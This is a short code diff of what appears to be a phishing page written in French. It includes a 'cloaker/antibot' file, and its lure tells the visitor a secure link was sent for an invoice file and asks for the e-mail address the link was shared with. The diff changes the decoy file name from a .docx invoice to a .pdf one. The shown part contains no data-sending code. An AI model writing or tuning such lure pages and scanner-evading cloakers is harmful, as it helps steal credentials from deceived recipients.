@@ -85,7 +85,7 @@ require_once __DIR__ . '/includes/index.php'; // your cloaker/antibot
 
       <section class="card-body">
         <p>Un lien sécurisé vous a été envoyé pour&nbsp;:</p>
-        <div class="file" id="fileName">FAC64836-2025.docx</div>
+        <div class="file" id="fileName">FA83659-2025.pdf</div>
         <p>Pour ouvrir ce lien sécurisé, saisissez l’adresse e-mail avec laquelle il a été partagé.</p>
 
         <div class="field">
